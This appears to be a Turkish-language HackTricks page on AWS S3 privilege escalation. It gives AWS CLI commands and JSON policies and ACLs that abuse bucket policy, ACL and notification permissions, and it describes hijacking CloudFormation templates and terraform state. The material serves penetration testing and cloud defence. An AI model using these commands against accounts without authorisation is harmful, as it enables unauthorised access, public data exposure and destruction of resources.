# AWS - S3 Privesc

{{#include ../../../../banners/hacktricks-training.md}}

## S3

### `s3:PutBucketNotification`, `s3:PutObject`, `s3:GetObject`

Bu izinlere sahip bir saldırgan, ilgili buckets üzerinde kaynakları ele geçirip imtiyaz yükseltmesi yapabilir.

Örneğin, "cf-templates-nohnwfax6a6i-us-east-1" adlı bir cloudformation bucket üzerindeki **izinlere** sahip bir saldırgan dağıtımı ele geçirebilecektir. Erişim aşağıdaki policy ile verilebilir:
```json
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": [
"s3:PutBucketNotification",
"s3:GetBucketNotification",
"s3:PutObject",
"s3:GetObject"
],
"Resource": [
"arn:aws:s3:::cf-templates-*/*",
"arn:aws:s3:::cf-templates-*"
]
},
{
"Effect": "Allow",
"Action": "s3:ListAllMyBuckets",
"Resource": "*"
}
]
}
```
Ve hijack mümkündür çünkü bucket'a **template yüklendiği andan itibaren oluşan küçük bir zaman penceresi** ile **template'in dağıtıldığı an** arasında bir boşluk vardır. Bir saldırgan, hesabında **lambda function** oluşturarak **bucket bildirimi gönderildiğinde tetiklenen** bir fonksiyonla o **bucket**'ın **content**'ini **hijacks** edebilir.

![](<../../../images/image (174).png>)

Pacu modülü [`cfn__resouce_injection`](https://github.com/RhinoSecurityLabs/pacu/wiki/Module-Details#cfn__resource_injection) bu saldırıyı otomatikleştirmek için kullanılabilir.  
Daha fazla bilgi için orijinal araştırmayı inceleyin: [https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/](https://rhinosecuritylabs.com/aws/cloud-malware-cloudformation-injection/)

### `s3:PutObject`, `s3:GetObject` <a href="#s3putobject-s3getobject" id="s3putobject-s3getobject"></a>

Bu izinler S3'e **nesneleri alma ve yükleme** yetkisini verir. AWS içindeki (ve dışındaki) birkaç servis, S3 depolamayı **config files** saklamak için kullanır. Bir saldırganın bunlara **read access** varsa, üzerinde **sensitive information** bulabilir. Bunlara **write access** olan bir saldırgan, **verileri değiştirip bazı servisleri kötüye kullanarak ayrıcalıkları yükseltmeye çalışabilir**. Bunlar bazı örneklerdir:

- Eğer bir EC2 instance **kullanıcı verilerini bir S3 bucket'ında** saklıyorsa, bir saldırgan bunu değiştirerek **EC2 instance içinde rastgele kod çalıştırabilir**.

### `s3:PutObject`, `s3:GetObject` (optional) over terraform state file

Genellikle [terraform](https://cloud.hacktricks.wiki/en/pentesting-ci-cd/terraform-security.html) state dosyaları bulut sağlayıcılarının blob depolama alanlarına, ör. AWS S3'e kaydedilir. Bir state dosyasının dosya uzantısı `.tfstate`'dir ve bucket isimleri genellikle terraform state dosyalarını içerdiğini belli eder. Genellikle her AWS hesabının, hesabın durumunu gösteren state dosyalarını saklamak için böyle bir bucket'ı vardır. Gerçek dünyadaki hesaplarda neredeyse her zaman tüm geliştiriciler `s3:*` iznine sahiptir ve bazen iş kullanıcıları bile `s3:Put*` iznine sahiptir.

Dolayısıyla, bu dosyalar üzerinde listelenen izinlere sahipseniz, pipeline'da `terraform` ayrıcalıklarıyla RCE elde etmenizi sağlayan bir saldırı vektörü vardır — çoğu zaman `AdministratorAccess`, bu da sizi bulut hesabının yöneticisi yapar. Ayrıca bu vektörü, `terraform`'ın meşru kaynakları silmesini sağlayarak denial of service saldırısı yapmak için kullanabilirsiniz.

Doğrudan kullanılabilecek exploit kodu için *Abusing Terraform State Files* bölümündeki *Terraform Security* sayfasındaki açıklamayı takip edin:

{{#ref}}
../../../../pentesting-ci-cd/terraform-security.md#abusing-terraform-state-files
{{#endref}}

### `s3:PutBucketPolicy`

Bir saldırganın **aynı hesaptan** olması gerekir; aksi takdirde `The specified method is not allowed` hatası tetiklenir. Bu izinle, kendisine bucket(lar) üzerinde daha fazla yetki verebilir ve böylece bucket'ları okuyup, yazıp, değiştirebilir, silebilir ve açığa çıkarabilir.
```bash
# Update Bucket policy
aws s3api put-bucket-policy --policy file:///root/policy.json --bucket <bucket-name>

## JSON giving permissions to a user and mantaining some previous root access
{
"Id": "Policy1568185116930",
"Version":"2012-10-17",
"Statement":[
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:root"
},
"Action":"s3:ListBucket",
"Resource":"arn:aws:s3:::somebucketname"
},
{
"Effect":"Allow",
"Principal":{
"AWS":"arn:aws:iam::123123123123:user/username"
},
"Action":"s3:*",
"Resource":"arn:aws:s3:::somebucketname/*"
}
]
}

## JSON Public policy example
### IF THE S3 BUCKET IS PROTECTED FROM BEING PUBLICLY EXPOSED, THIS WILL THROW AN ACCESS DENIED EVEN IF YOU HAVE ENOUGH PERMISSIONS
{
"Id": "Policy1568185116930",
"Version": "2012-10-17",
"Statement": [
{
"Sid": "Stmt1568184932403",
"Action": [
"s3:ListBucket"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome",
"Principal": "*"
},
{
"Sid": "Stmt1568185007451",
"Action": [
"s3:GetObject"
],
"Effect": "Allow",
"Resource": "arn:aws:s3:::welcome/*",
"Principal": "*"
}
]
}
```
### `s3:GetBucketAcl`, `s3:PutBucketAcl`

Bir attacker, bu izinleri belirli buckets üzerinde kendisine **daha fazla erişim vermek** için kötüye kullanabilir.\
Unutmayın ki attacker aynı hesapta olmak zorunda değildir. Ayrıca write access
```bash
# Update bucket ACL
aws s3api get-bucket-acl --bucket <bucket-name>
aws s3api put-bucket-acl --bucket <bucket-name> --access-control-policy file://acl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectAcl`

Bir saldırgan, bu izinleri kötüye kullanarak buckets içindeki belirli nesneler üzerinde kendisine daha fazla erişim sağlayabilir.
```bash
# Update bucket object ACL
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --access-control-policy file://objacl.json

##JSON ACL example
## Make sure to modify the Owner’s displayName and ID according to the Object ACL you retrieved.
{
"Owner": {
"DisplayName": "<DisplayName>",
"ID": "<ID>"
},
"Grants": [
{
"Grantee": {
"Type": "Group",
"URI": "http://acs.amazonaws.com/groups/global/AuthenticatedUsers"
},
"Permission": "FULL_CONTROL"
}
]
}
## An ACL should give you the permission WRITE_ACP to be able to put a new ACL
```
### `s3:GetObjectAcl`, `s3:PutObjectVersionAcl`

Bu ayrıcalıklara sahip bir saldırganın belirli bir object version'a Acl koyabilmesi beklenir.
```bash
aws s3api get-object-acl --bucket <bucekt-name> --key flag
aws s3api put-object-acl --bucket <bucket-name> --key flag --version-id <value> --access-control-policy file://objacl.json
```
{{#include ../../../../banners/hacktricks-training.md}}
